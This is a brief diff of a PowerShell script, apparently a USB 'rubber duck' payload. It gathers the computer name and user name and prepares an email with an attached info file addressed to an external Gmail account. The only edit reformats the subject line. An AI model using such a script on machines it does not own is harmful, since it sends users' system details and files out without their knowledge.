@@ -20,7 +20,7 @@ $TO = "patitodegoma404@gmail.com"
 
 $PC_NAME = "$env:computername"
 $USER_NAME = "$env:UserName"
-$SUBJECT = "El patito de - " + $PC_NAME + " " + $USER_NAME
+$SUBJECT = "El patito de - " + $USER_NAME + "@" + $PC_NAME
 $BODY = "Info de " + $PC_NAME + " from " + $USER_NAME + " adjuntada."
 $ATTACH = "C:\IT\info.txt"
 
